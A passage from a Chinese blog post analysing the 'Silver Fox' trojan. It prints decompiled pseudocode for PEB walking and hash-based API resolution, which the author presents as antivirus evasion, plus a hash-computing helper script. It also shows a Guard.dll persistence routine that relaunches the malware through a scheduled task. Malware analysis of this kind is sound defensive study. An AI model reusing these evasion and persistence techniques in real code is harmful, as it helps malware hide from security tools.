class="number">10</span>];             <span class="comment">// 0x8(InMemoryOrderModuleList 距离结构体起始位置)</span></span><br><span class="line">                                              <span class="comment">// +0x24(到 BaseDllName)</span></span><br><span class="line">                                              <span class="comment">// +0x4(到其中的 Buffer) BaseDllName-&gt;Buffer 地址</span></span><br><span class="line">                                              <span class="comment">// 于是这就是为什么偏移为 10（汇编显示 0x28）</span></span><br><span class="line">                                              <span class="comment">// https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_UNICODE_STRING</span></span><br><span class="line">  v2 = *((<span class="type">unsigned</span> __int16 *)i + <span class="number">18</span>) &gt;&gt; <span class="number">1</span>;    <span class="comment">// 除以 2？WCHAR？</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; v2; --v2 )                     <span class="comment">// 计算哈希，匹配函数名</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *v1++;                               <span class="comment">// 每次读取一个 unicode</span></span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="number">0x61</span> )</span><br><span class="line">      LOWORD(v4) = v4 - <span class="number">0x20</span>;</span><br><span class="line">    j = (<span class="type">unsigned</span> __int16)v4 + <span class="number">131</span> * j;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (j &amp; <span class="number">0x7FFFFFFF</span>) == <span class="number">0x1CCA9CE6</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中有一个 <code>__readfsdword(0x30u)</code>，一开始不理解是什么意思。后面问了 ai 发现 <code>fs</code> 段寄存器总会存放 teb 结构的指针。<br>有关 teb、peb 的由来和在 shellcode 中的用途可以参考以下这几篇文章，解释得非常好：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-266678.htm">https://bbs.kanxue.com/thread-266678.htm</a><br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1612">https://forum.butian.net/share/1612</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10491">https://xz.aliyun.com/news/10491</a></p>
</blockquote>
<p>简单来讲，就是 <a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_TEB32">teb</a> 结构体的 0x18 位置存放着 teb 结构体自身的地址（因为不可能直接从 fs 寄存器得到 teb 结构体的地址信息，fs 只是个段选择器）， 得到 teb 结构体的地址后，从 teb 中的 +0x30 位置（x86 下），存放着指向 peb 结构体的指针，<a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_PEB">peb</a> 存放了有关进程的信息。<br>而 peb 结构体中又存放了一条链 <a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_PEB_LDR_DATA">ldr</a> <code>struct _PEB_LDR_DATA* Ldr</code>（0xC 偏移——x86 的），存放了当前进程中模块的链表信息。<br>其中的 <code>InLoadOrderModuleList</code>、<code>InMemoryOrderModuleList</code>、<code>InInitializationOrderModuleList</code> 都是双向链表类型 <code>_LIST_ENTRY</code>，但是并非如此，它们实际的类型应该是 <a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_LDR_DATA_TABLE_ENTRY"><code>_LDR_DATA_TABLE_ENTRY</code></a>，这个结构体的前几个成员如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InLoadOrderLinks</span>;</span>                                    <span class="comment">//0x0</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InMemoryOrderLinks</span>;</span>                                  <span class="comment">//0x8</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InInitializationOrderLinks</span>;</span>                          <span class="comment">//0x10</span></span><br><span class="line">VOID* DllBase;                                                          <span class="comment">//0x18</span></span><br><span class="line">VOID* EntryPoint;                                                       <span class="comment">//0x1c</span></span><br><span class="line">ULONG SizeOfImage;                                                      <span class="comment">//0x20</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">FullDllName</span>;</span>                                     <span class="comment">//0x24</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">BaseDllName</span>;</span>                                     <span class="comment">//0x2c</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>其中的 <code>InLoadOrderLinks</code>、<code>InMemoryOrderLinks</code>、<code>InInitializationOrderLinks</code> 分别都指向了下一个模块的 <code>InLoadOrderLinks</code>、<code>InMemoryOrderLinks</code>、<code>InInitializationOrderLinks</code>（此处要注意运算问题，这三者指向的位置不同，距离结构体的起始位置也不同，计算时要注意，可以看看上面推荐的几篇帖子里提到的内容。）<br>通过其中一条链找到下一个模块的地址，然后比较 <code>BaseDllName</code>（中的 <a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_UNICODE_STRING"><code>Buffer</code></a>）计算得到的哈希结果是否与 <code>0x1CCA9CE6</code> 相等，即要找的模块。这里要查找的是 <code>kernel32.dll</code>。</p>
<h4 id="sub-747-——hash-匹配（免杀）"><a href="#sub-747-——hash-匹配（免杀）" class="headerlink" title="sub_747()——hash 匹配（免杀）"></a><code>sub_747()</code>——hash 匹配（免杀）</h4><p>下面这一段代码依旧是解析 dll 的 pe 头，找到 eat 导出表然后遍历来获取指定的函数。与前面查找 <code>kernel32.dll</code> 的做法类似。<br>（也是又复习了一次导出表）</p>
<p>最终解密的结果都在前面那个函数的注释里了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_747@&lt;eax&gt;(<span class="type">int</span> a1@&lt;esi&gt;, <span class="type">int</span> a2, <span class="type">int</span> (__stdcall *a3)(<span class="type">int</span>, _BYTE *))</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *eat_rva; <span class="comment">// ecx</span></span><br><span class="line">  _DWORD *eat; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> rva_names; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> rva_funcs; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> addr_ordinals; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> addr_names_1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> addr_funcs; <span class="comment">// edi</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num_names_1; <span class="comment">// [esp+8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> addr_ordinals_1; <span class="comment">// [esp+Ch] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">  _BYTE *v18; <span class="comment">// [esp+18h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  eat_rva = (_DWORD *)(*(_DWORD *)(a1 + <span class="number">0x3C</span>) + a1 + <span class="number">0x78</span>);<span class="comment">// +0x3c 获取 nt 头地址</span></span><br><span class="line">                                                <span class="comment">// +0x78 获取 eat rva</span></span><br><span class="line">  <span class="keyword">if</span> ( !*eat_rva )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(*(_DWORD *)(a1 + <span class="number">0x3C</span>) + a1 + <span class="number">0x7C</span>) )<span class="comment">// +0x7c eat size</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  eat = (_DWORD *)(a1 + *eat_rva);              <span class="comment">// IMAGE_EXPORT_DIRECTORY</span></span><br><span class="line">  num_names_1 = eat[<span class="number">6</span>];                         <span class="comment">// NumberOfNames</span></span><br><span class="line">  <span class="keyword">if</span> ( !num_names_1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  rva_names = eat[<span class="number">8</span>];                           <span class="comment">// AddressOfNames</span></span><br><span class="line">  rva_funcs = eat[<span class="number">7</span>];                           <span class="comment">// AddressOfFunctions</span></span><br><span class="line">  addr_ordinals = a1 + eat[<span class="number">9</span>];                  <span class="comment">// AddressOfNameOrdinals</span></span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  addr_names_1 = a1 + rva_names;</span><br><span class="line">  addr_funcs = a1 + rva_funcs;</span><br><span class="line">  addr_ordinals_1 = addr_ordinals;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = (_BYTE *)(a1 + *(_DWORD *)(addr_names_1 + <span class="number">4</span> * v8));</span><br><span class="line">    v18 = v11;</span><br><span class="line">    <span class="keyword">if</span> ( *v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = *v11;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v13 = v12 + <span class="number">131</span> * v13;                  <span class="comment">// 计算哈希</span></span><br><span class="line">        v12 = *++v18;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( *v18 );</span><br><span class="line">      addr_ordinals = addr_ordinals_1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (v13 &amp; <span class="number">0x7FFFFFFF</span>) == a2 )             <span class="comment">// 比较哈希</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v8 = v17 + <span class="number">1</span>;</span><br><span class="line">    v17 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt;= num_names_1 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">    <span class="keyword">return</span> a3(a1, v11);                         <span class="comment">// GetProcAddress 直接导出</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> a1 + *(_DWORD *)(addr_funcs + <span class="number">4</span> * *(<span class="type">unsigned</span> __int16 *)(addr_ordinals + <span class="number">2</span> * v17));<span class="comment">// ordinals 导出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="手搓脚本解密（忽略）"><a href="#手搓脚本解密（忽略）" class="headerlink" title="手搓脚本解密（忽略）"></a>手搓脚本解密（忽略）</h5><p>（因为没有动态环境所以只能搓一个脚本解密了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">IsForwarder</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* lpszName)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strstr</span>(lpszName, <span class="string">&quot;.&quot;</span>) != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * <span class="title function_">HashCalc</span><span class="params">(<span class="type">char</span>* lpszName, <span class="type">unsigned</span> <span class="type">int</span> * dwHash)</span></span><br><span class="line">&#123;</span><br><span class="line">    *dwHash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*lpszName)</span><br><span class="line">    &#123;</span><br><span class="line">        *dwHash = *lpszName + <span class="number">131</span> * *dwHash;</span><br><span class="line">        lpszName++;</span><br><span class="line">    &#125;</span><br><span class="line">    *dwHash &amp;= <span class="number">0x7fffffff</span>;</span><br><span class="line">    lpszName++;</span><br><span class="line">    <span class="keyword">return</span> lpszName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dwHash;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* pModule;</span><br><span class="line">    <span class="type">char</span>* eat;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dwExportRVA;</span><br><span class="line">    <span class="type">int</span> dwNumberOfNames;</span><br><span class="line">    <span class="type">char</span>* pNames;</span><br><span class="line">    <span class="comment">//HMODULE hMod = LoadLibraryA(&quot;C:\\Windows\\SysWOW64\\kernel32.dll&quot;);</span></span><br><span class="line">    <span class="comment">//HMODULE hMod = GetModuleHandleA(&quot;kernel32.dll&quot;);</span></span><br><span class="line">    <span class="comment">//HMODULE hMod = GetModuleHandleA(&quot;ntdll.dll&quot;);</span></span><br><span class="line">    HMODULE hMod = LoadLibraryA(<span class="string">&quot;ws2_32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hMod == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pModule = (<span class="type">unsigned</span> <span class="type">char</span>*)hMod;</span><br><span class="line">    <span class="comment">// 获取 eat 位置</span></span><br><span class="line">    dwExportRVA = *(<span class="type">int</span>*)(pModule + *(pModule + <span class="number">0x3c</span>) + <span class="number">0x78</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;export directory @%#x\n&quot;</span>, dwExportRVA);</span><br><span class="line">    eat = (<span class="type">char</span> *)(pModule + dwExportRVA);</span><br><span class="line">    <span class="comment">// 获取 AddressOfNames 地址</span></span><br><span class="line">    <span class="comment">// 索引从 0 开始注意</span></span><br><span class="line">    dwNumberOfNames = *(<span class="type">int</span> *)(eat + <span class="number">4</span> * <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dwNumberOfNames);</span><br><span class="line">    pNames = (<span class="type">char</span> *)(pModule + *(<span class="type">int</span>*)(eat + <span class="number">4</span> * <span class="number">8</span>));</span><br><span class="line">    pNames = (<span class="type">char</span>*)(pModule + *(<span class="type">int</span> *)pNames);</span><br><span class="line">    <span class="comment">//printf(&quot;%x %s\n&quot;, HashCalc(pNames), pNames);</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwNumberOfNames; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (IsForwarder(pNames))<span class="comment">// 跳过转发器函数</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                pNames++;</span><br><span class="line">            &#125; <span class="keyword">while</span> (*pNames);</span><br><span class="line">            pNames++;</span><br><span class="line">            i--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>, pNames);</span><br><span class="line">        pNames = HashCalc(pNames, &amp;dwHash);<span class="comment">// 传入的是地址不是变量，所以不能直接修改参数达到修改外部变量的目的。</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%#X&quot;</span>, dwHash);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FreeLibrary(hMod);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sub-33A-sub-4DF-外部通信（未完成）"><a href="#sub-33A-sub-4DF-外部通信（未完成）" class="headerlink" title="sub_33A() &#x2F; sub_4DF() 外部通信（未完成）"></a><code>sub_33A()</code> &#x2F; <code>sub_4DF()</code> 外部通信（未完成）</h4><p>这一部分没办法完全静态分析，基本上都是通过各种变量来调用函数。<br><del>（以后配置好环境了再回来动调看一下。）</del></p>
<h2 id="Guard-dll-1"><a href="#Guard-dll-1" class="headerlink" title="Guard.dll"></a>Guard.dll</h2><p>直接用工具分析 pe，会发现导出表中仅导出了一个函数 <code>MonitorAndRestart</code>。</p>
<h3 id="MonitorAndRestart"><a href="#MonitorAndRestart" class="headerlink" title="MonitorAndRestart()"></a><code>MonitorAndRestart()</code></h3><p>创建了一个互斥体，然后判断 <code>WindowsEvent.exe</code> 运行与否，选择是否执行计划任务。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hObject = CreateMutexW(<span class="number">0</span>, <span class="number">0</span>, <span class="string">L&quot;Global\\ProcessMonitorDLL_Mutex&quot;</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">sub_10001040(CommandLine, <span class="number">256</span>, <span class="string">L&quot;schtasks /run /tn \&quot;%s\&quot;&quot;</span>, <span class="string">L&quot;WindowsEvent_Task&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>完整伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">HANDLE __stdcall <span class="title function_">MonitorAndRestart</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, LPCCH lpMultiByteStr, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// ecx</span></span><br><span class="line">  DWORD LastError; <span class="comment">// [esp-4h] [ebp-584h]</span></span><br><span class="line">  DWORD ExitCode; <span class="comment">// [esp+Ch] [ebp-574h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+10h] [ebp-570h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOW</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+28h] [ebp-558h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">256</span>]; <span class="comment">// [esp+70h] [ebp-510h] BYREF</span></span><br><span class="line">  WCHAR WideCharStr[<span class="number">17</span>]; <span class="comment">// [esp+170h] [ebp-410h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">486</span>]; <span class="comment">// [esp+192h] [ebp-3EEh] BYREF</span></span><br><span class="line">  WCHAR CommandLine[<span class="number">258</span>]; <span class="comment">// [esp+378h] [ebp-208h] BYREF</span></span><br><span class="line"></span><br><span class="line">  hObject = CreateMutexW(<span class="number">0</span>, <span class="number">0</span>, <span class="string">L&quot;Global\\ProcessMonitorDLL_Mutex&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hObject &amp;&amp; GetLastError() == <span class="number">183</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = hObject;</span><br><span class="line">    <span class="keyword">if</span> ( hObject )</span><br><span class="line">      <span class="keyword">return</span> (HANDLE)CloseHandle(hObject);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  wcscpy(WideCharStr, <span class="string">L&quot;WindowsEvent.exe&quot;</span>);</span><br><span class="line">  sub_100026C0(v12, <span class="number">0</span>, <span class="number">486</span>);</span><br><span class="line">  <span class="keyword">if</span> ( lpMultiByteStr &amp;&amp; *lpMultiByteStr )</span><br><span class="line">  &#123;</span><br><span class="line">    MultiByteToWideChar(<span class="number">0</span>, <span class="number">0</span>, lpMultiByteStr, <span class="number">-1</span>, WideCharStr, <span class="number">260</span>);</span><br><span class="line">    sub_10001080(WideCharStr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_100011A0(WideCharStr) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    sub_10001080(&amp;unk_10020F18);</span><br><span class="line">    sub_100026C0(CommandLine, <span class="number">0</span>, <span class="number">512</span>);</span><br><span class="line">    sub_10001040(CommandLine, <span class="number">256</span>, <span class="string">L&quot;schtasks /run /tn \&quot;%s\&quot;&quot;</span>, <span class="string">L&quot;WindowsEvent_Task&quot;</span>);</span><br><span class="line">    StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">    sub_100026C0(&amp;StartupInfo.lpReserved, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">    ProcessInformation = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( !CreateProcessW(<span class="number">0</span>, CommandLine, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x8000000</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    WaitForSingleObject(ProcessInformation.hProcess, <span class="number">0x1388</span>u);</span><br><span class="line">    ExitCode = <span class="number">0</span>;</span><br><span class="line">    GetExitCodeProcess(ProcessInformation.hProcess, &amp;ExitCode);</span><br><span class="line">    CloseHandle(ProcessInformation.hProcess);</span><br><span class="line">    CloseHandle(ProcessInformation.hThread);</span><br><span class="line">    <span class="keyword">if</span> ( ExitCode )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_10001040(v10, <span class="number">128</span>, &amp;unk_10020E30, ExitCode);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">    Sleep(<span class="number">0xBB8</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !sub_100011A0(WideCharStr) )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;unk_10020F64;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_12:</span><br><span class="line">    Sleep(<span class="number">0x3E8</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  LastError = GetLastError();</span><br><span class="line">  sub_10001040(v10, <span class="number">128</span>, &amp;unk_10020E58, LastError);</span><br><span class="line">LABEL_16:</span><br><span class="line">  sub_10001080(v10);</span><br><span class="line">  v5 = &amp;unk_10020F90;</span><br><span class="line">LABEL_17:</span><br><span class="line">  sub_10001080(v5);</span><br><span class="line">  sub_10001270();</span><br><span class="line">  result = hObject;</span><br><span class="line">  <span class="keyword">if</span> ( hObject )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (HANDLE)CloseHandle(hObject);</span><br><span class="line">    hObject = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这次跟着大佬的帖子分析这个银狐木马，学习到好多之前没有了解过或者已经忘记了的技能知识。</p>
<ul>
<li><strong>如果有动调的环境，一定要配合静态分析使用！！！</strong>（这个深有体会，纯静态分析看得非常累，很多东西要么靠经验猜测，要么只能跟着大佬的帖子走；手搓脚本跟静态分析一样累，还要处理很多看不到的问题，浪费时间）</li>
<li>学习了 PE 结构体的内容，其中“定位导出表”更是手动分析了好几次，印象深刻。</li>
<li>学习了有关 <code>TEB</code> 和 <code>PEB</code> 的内容，了解了 windows 下的 <code>fs</code> &#x2F; <code>gs</code> 段寄存器的作用，也了解了如何通过这两个结构体指针找到进程中的某个已加载模块，从而规避杀毒软件的检测，调用敏感函数。（这一个知识点印象深刻）</li>
<li>由于没有动调环境，所以尝试手搓了好几个脚本，其中包括通过哈希查找函数名和函数地址的脚本。这个脚本一开始还运行不太正常，后面了解到是因为把导出表中的一些<strong>转发器函数</strong>也计算出来了，导致最后得到的函数数量和 <code>kernel32.dll</code> 中的 <code>NumberOfNames</code> 结果对不上。（这个以后也要稍微学习一下）</li>
</ul>

